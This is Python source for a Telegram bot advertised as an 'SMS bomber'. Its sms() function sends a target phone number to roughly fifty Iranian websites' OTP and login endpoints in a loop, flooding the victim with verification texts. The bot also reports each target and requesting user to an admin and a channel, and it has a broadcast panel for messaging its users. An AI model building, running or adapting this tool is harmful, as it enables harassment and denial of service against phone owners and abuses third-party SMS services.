from telethon import TelegramClient, events,Button
import asyncio
import requests,os,asyncio
from threading import Thread
import asyncio , requests , json , os
api_id =  # ایپی ایدی
api_hash = "" # ایپی هش
nml="شما ادمین ربات نیستید"
# لاین 262 هم ایدی عددی چنل با -100
bc = [
        [Button.inline('⚡️ Back ⚡️', 'back')],
    ]

keyboard_admin = [[
        Button.inline('Send Messages Users', data="msg"),
        Button.inline('Forward Messages Users', data="fmsg")],
        [Button.inline('Back Up Users', data="bac"),
        Button.inline('Number Of Users', data="usrs")],
        [Button.url('⚡ Creator ⚡️', url=f"https://t.me/QuiteTeam")],
    ]
if not os.path.exists('Users.txt') :
    o = open('Users.txt','w')
    o.write('')
    o.close()
async def NewUser(fi) :
    o = open('Users.txt','r')
    Re = o.read()
    o.close()
    if not str(fi) in str(Re) :
        o = open('Users.txt','a')
        o.write(str(fi) + '\n')
        o.close()
async def GetStatus() :
    o = open('Users.txt','r')
    x = o.read()
    o.close()
    i = 0
    for _ in x.split('\n') :
        i = i + 1
    return str(i)

client = TelegramClient("ksosnsna" , api_id , api_hash).start(bot_token="")
admin = [1760968477] #ایدی عددی ادمین
channel = "QuiteTeam"
@client.on(events.NewMessage(from_users=admin,pattern=r'/panel'))
async def adminmain(event):
	await event.reply("**🚡 Hi Dear Admin ! Welcome To Panel Admin !**",buttons=keyboard_admin)
	
async def checkjoin(userids):
    check = await client.get_chat_member(chat_id = chanelluserid , user_id=userids)
    if "kicked" not in check.status and "left" not in check.status:
        return True
    else:
        await client.send_message(userids , f"👤 Dear user\n\n🔰 To use the robot, you must be a member of the following channel.  Please subscribe to the channel and resubmit /start .",buttons=[ [Button.url('⚡ Join ⚡️', url=f"https://t.me/QuiteTeam")] ])
        return False
	
def sms(number):
    for i in range(3):
		api = "https://i.devslop.app/app/ifollow/api/otp.php"
		headers = {"Content-Type": "application/x-www-form-urlencoded; charset\u003dUTF-8" , "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 10; M2007J20CG MIUI/V12.0.9.0.QJGMIXM)" , "Host": "i.devslop.app" , "Connection": "Keep-Alive" , "Accept-Encoding": "gzip" , "Content-Length": "32"}
	    data = ("number={}&state=number&".format(number))
	    url1 = "https://api.digikala.com/v1/user/authenticate/"
	    number1 = {"username":number}
	    sms1 = requests.post(url1, data=number1)
	    r = requests.post(api, headers=headers, data=data)
	    url2 = "https://chamedoon.com/api/v1/membership/guest/request_mobile_verification"
	    x = {"mobile":number}
	    sms2 = requests.post(url2, data=x)
	    url3 = "https://www.pubisha.com/login/checkCustomerActivation"
	    dbs = {"mobile":number}
	    sms3 = requests.post(url3, data=dbs)
	    url4 = "https://www.shab.ir/api/fa/sandbox/v_1_4/auth/number-mobile"
	    n4 = {"mobile":number}
	    sms4 = requests.post(url4, data=n4)
	    
	    url5 = "https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.0&UDID=4e012cac-7c9d-4a6f-b21e-c90fbe775139&locale=fa"
	    number5 = {"cellphone":number}
	    sms5 = requests.post(url5, data=number5)
	    
	    url6 = "https://hiword.ir/wp-json/otp-login/v1/login"
	    number6 = {"identifier":number}
	    sms6 = requests.post(url6, data=number6)
	    url7 = "https://abantether.com/users/register/phone/send/"
	    number7 = {"phoneNumber":number}
	    sms7 = requests.post(url7, data=number7)
	    url8 = "https://api.bit24.cash/api/v3/auth/check-mobile"
	    number8 = {"mobile":number}
	    sms8 = requests.post(url8, data=number8)
	    url9 = "https://dicardo.com/main/sendsms"
	    number9 = {"phone":number}
	    sms9 = requests.post(url9, data=number9)
	    url10 = "https://ghasedak24.com/user/ajax_register"
	    number10 = {"username":number}
	    sms10 = requests.post(url10, data=number10)
	    url11 = "https://tikban.com/Account/LoginAndRegister"
	    number11 = {"CellPhone":number}
	    sms11 = requests.post(url11, data=number11)
	    url12 = "https://www.digistyle.com/users/login-register/"
	    number12 = {"loginRegister[email_phone]":number}
	    sms12 = requests.post(url12, data=number12)
	    url13 = "https://mobapi.banimode.com/api/v2/auth/request"
	    number13 = {"phone":number}
	    sms13 = requests.post(url13, data=number13)
	    
	    url15 = "https://banankala.com/home/login"
	    number15 = {"Mobile":number}
	    sms15 = requests.post(url15, data=number15)
	    url16 = "https://www.iranketab.ir/account/register"
	    number16 = {"UserName":number}
	    sms16 = requests.post(url16, data=number16)
	    url17 = "https://ketabchi.com/api/v1/auth/requestVerificationCode"
	    number17 = {"phoneNumber":number}
	    sms17 = requests.post(url17, data=number17)
	    url18 = f"https://join.tapsi.ir/smsConfirm?phoneNumber={number}"
	    sms18 = requests.get(url18)
	    url19 = "https://www.offdecor.com/index.php?route=account/login/sendCode"
	    number19 = {"phone":number}
	    sms19 = requests.post(url19, data=number19)
	    url20 = "https://exo.ir/index.php?route=account/mobile_login"
	    number20 = {"mobile_number":number}
	    sms20 = requests.post(url20, data=number20)
	    url21 = "https://shahrfarsh.com/Account/Login"
	    number21 = {"phoneNumber":number}
	    sms21 = requests.post(url21, data=number21)
	    url22 = "https://takfarsh.com/wp-content/themes/bakala/template-parts/send.php"
	    number22 = {"phone_email":number}
	    sms22 = requests.post(url22, data=number22)
	    url23 = "https://shop.beheshticarpet.com/my-account/"
	    number23 = {"billing_mobile":number}
	    sms23 = requests.post(url23, data=number23)	
	    url24 = f"https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone={number}"
	    sms24 = requests.post(url24)
	    url25 = f"https://api.torob.com/v4/user/phone/send-pin/?phone_number={number}"
	    sms25 = requests.get(url25)
	    url26 = "https://www.khanoumi.com/accounts/sendotp"
	    number26 = {"mobile":number}
	    sms26 = requests.post(url26, data=number26)
	    url27 = "https://rojashop.com/api/auth/sendOtp"
	    number27 = {"mobile":number}
	    sms27 = requests.post(url27, data=number27)
	    url28 = "https://dadpardaz.com/advice/getLoginConfirmationCode"
	    number28 = {"mobile":number}
	    sms28 = requests.post(url28, data=number28)
	    url29 = "https://api.rokla.ir/api/request/otp"
	    number29 = {"mobile":number}
	    sms29 = requests.post(url29, data=number29)
	    url30 = "https://khodro45.com/api/v1/customers/otp/"
	    number30 = {"mobile":number}
	    sms30 = requests.post(url30, data=number30)
	    url31 = "https://mashinbank.com/api2/users/check"
	    number31 = {"mobileNumber":number}
	    sms31 = requests.post(url31, data=number31)	
	    url32 = "https://api.pezeshket.com/core/v1/auth/requestCode"
	    number32 = {"mobileNumber":number}
	    sms32 = requests.post(url32, data=number32)
	    url33 = "https://api.timcheh.com/auth/otp/send"
	    number33 = {"mobile":number}
	    sms33 = requests.post(url33, data=number33)
	    url34 = f"https://api.helsa.co/api/User/GetRegisterCode?mobileNumber={number}&deviceId=050102153736100048967953736091842424&discountCode=&utm_content=&utm_source=&utm_campain="
	    sms34 = requests.get(url34)
	    url35 = "https://client.api.paklean.com/user/resendCode"
	    number35 = {"username":number}
	    sms35 = requests.post(url35, data=number35)
	    url36 = "https://mobogift.com/signin"
	    number36 = {"username":number}
	    sms36 = requests.post(url36, data=number36)
	    url37 = "https://api.iranicard.ir/api/v1/register"
	    number37 = {"mobile":number}
	    sms37 = requests.post(url37, data=number37)
	    url38 = f"https://pubg-sell.ir/loginuser?username={number}"
	    sms38 = requests.get(url38)
	    url39 = "https://tj8.ir/auth/register"
	    number39 = {"mobile":number}
	    sms39 = requests.post(url39, data=number39)
	    url40 = "https://www.digistyle.com/users/login-register/"
	    number40 = {"loginRegister[email_phone]":number}
	    sms40 = requests.post(url40, data=number40)
	   	
	    url41 = "https://cinematicket.org/api/v1/users/signup"
	    number41 = {"phone_number":number}
	    sms41 = requests.post(url41, data=number41)
	   	
	   	
	    url42 = "https://www.irantic.com//api/login/request"
	    number42 = {"mobile":number}
	    sms42 = requests.post(url42, data=number42)
	    
	    url43 = "https://kafegheymat.com/shop/getLoginSms"
	    number43 = {"phone":number}
	    sms43 = requests.post(url43, data=number43)
	   	
	    url44 = "https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass?client=PWA&optionalClient=PWA&deviceType=PWA&appVersion=5.6.6&optionalVersion=5.6.6&UDID=bb65d956-f88b-4fec-9911-5f94391edf85"
	    number44 = {"cellphone":number}
	    sms44 = requests.post(url44, data=number44)
	   	
	    url45 = "https://www.delino.com/user/register"
	    number45 = {"mobile":number}
	    sms45 = requests.post(url45, data=number45)
	   	
	   	
	    url46 = "https://alopeyk.com/api/sms/send.php"
	    number46 = {"phone":number}
	    sms46 = requests.post(url46, data=number46)
	   	
	    url47 = f"https://filmnet.ir/api-v2/access-token/users/{number}/otp"
	    sms47 = requests.get(url47)
	   	
	   	
	    url48 = f"https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/{number}/sms?cCode=+98"
	    sms48 = requests.get(url48)
	   	
	    url49 = "https://1401api.tamland.ir/api/user/signup"
	    number49 = {"Mobile":number}
	    sms49 = requests.post(url49, data=number49)
	   	
	   	
	    url50 = "https://www.offdecor.com/index.php?route=account/login/sendCode"
	    number50 = {"phone":number}
	    sms50 = requests.post(url50, data=number50)
	    
	    urlq = "https://shop.opco.co.ir/index.php?route=extension/module/login_verify/update_register_code"
	    numberq = {"telephone":number}
	    requests.post(urlq, data=numberq)
	    
	    urla = "https://api.timcheh.com/auth/otp/send"
	    numbera = {"mobile":number}
	    requests.post(urla, data=numbera)
	    
	    urlz = "https://api.digikalajet.ir/user/login-register/"
	    numberz = {"phone":number}
	    requests.post(urlz, data=numberz)
	    

#@client.message_handler(chat_types="private")
#async def handle_message(message):
#    text = message.text
#    userids = message.chat.id

#    if await checkjoin(userids) == False:
#        return
	    
@client.on(events.NewMessage(pattern="/start"))
async def bomber(event):
	user_id = event.sender_id
	await NewUser(user_id)
	Id=await GetStatus()
	chat = await event.get_chat()
	async with client.conversation(chat) as conv:
	   await conv.send_message("**🔴توجه توجه حتما این متن رو بخونید کاربر عزیز🔴\nسلام و درود به ربات ما خوش اومدی♥️ دقت کن که فقط تو پیام بعد شماره رو بفرستی تا اس ام اس بمبر کارش خودشو شروع کنه🔱\nبرای مثال : 09197777777\n\n🔴Attention Be sure to read this text, dear 🔴\nHello and welcome to our robot ♥️ Make sure to send the number only in the next message so that the SMS Bomber will start its work 🔱\nfor example : 09197777777\n\nDeveloper : @QuiteTeam**",buttons=[ [Button.url('⚡ Join ⚡️', url=f"https://t.me/QuiteTeam"),Button.url('⚡ Developer ⚡️', url=f"https://t.me/QuiteAdmin")] ])
	   response = await conv.get_response()
	   if response.raw_text.isdigit():
	   	await client.send_message(event.chat_id,f"**⛱ در حال ارسال بمبر برای شماره -> `{response.raw_text}`\n🕔 پس از تمام شدن عملیات ، ارسال پیام متوقف میشود !**")
	   	await client.send_message(1760968477,f"**⚠️ در حال ارسال بمبر برای شماره -> `{response.raw_text}` !\n🍁 کاربر استفاده کننده `{user_id}`**")
	   	Thread(target=sms, args=[response.raw_text]).start()
	   	await client.send_message(-100,f"**⚠️ در حال ارسال بمبر برای شماره -> `{response.raw_text}` !\n🍁 کاربر استفاده کننده `{user_id}`\n✅ بهترین ربات اسمس و کال بمبر رایگان سریع و عالی حتماً استفاده کنید**",buttons=[ [Button.url('⚡ Bot ⚡️', url=f"https://t.me/SirScBomberBot"),Button.url('⚡ Developer ⚡️', url=f"https://t.me/QuiteAdmin")] ])
	   else:
	   		await client.send_message(event.chat_id,"**فقط شماره رو ارسال کن🚡**\n**اگه میخوای اس ام اس بمبر رو شروع کنی استارت رو بزن**\nشماره باید با 09 شروع بشود\n/start")
	   		
@client.on(events.CallbackQuery(data='usrs'))
async def ids(event):
	x=await event.edit("`wait . . `")
	Id=await GetStatus()
	await x.edit(f"**users:{Id}**",buttons=bc)

@client.on(events.CallbackQuery(data='msg'))
async def for_bot(event):
	await event.delete()
	chat = await event.get_chat()
	async with client.conversation(chat) as conv:
		inp=await conv.send_message('**Send Your Message , For Send To All Users !**')
		response = await conv.get_response()
		pl=await event.reply('`Please Wait . . .`')
		o = open('Users.txt','r')
		x = o.read()
		o.close()
		for _ in x.split('\n') :
			try :
				await client.send_message(int(_),response.raw_text)
			except :
				pass
		await pl.delete()
		await inp.delete()
		await client.send_message(chat,'**Sent To All User !**',buttons=bc)

@client.on(events.CallbackQuery(data='fmsg'))
async def forbot(event):
	await event.delete()
	chat = await event.get_chat()
	async with client.conversation(chat) as conv:
		inp=await conv.send_message('**Send Your Message , For Forward  To All Users !**')
		response = await conv.get_response()
		pl=await event.reply('`Please Wait . . .`')
		o = open('Users.txt','r')
		x = o.read()
		o.close()
		for _ in x.split('\n') :
			try :
				await response.forward_to(int(_))
			except :
				pass
		await pl.delete()
		await inp.delete()
		await client.send_message(chat,'**Sent To All User !**',buttons=bc)
		
@client.on(events.CallbackQuery(data='back'))
async def back_handler(event):
	await event.edit("**🚡 Hi Dear Admin ! Welcome To Panel Admin !**",buttons=keyboard_admin)

@client.on(events.CallbackQuery(data='bac'))
async def backup(event):
	d=await event.edit("`wait . . `")
	await client.send_message(event.chat_id,file="Users.txt")
	await d.edit(f"👇",buttons=bc)

print("started")	   			   		
client.start()
client.run_until_disconnected()
	   		
#کسننت منبعو بپاکی از سورس
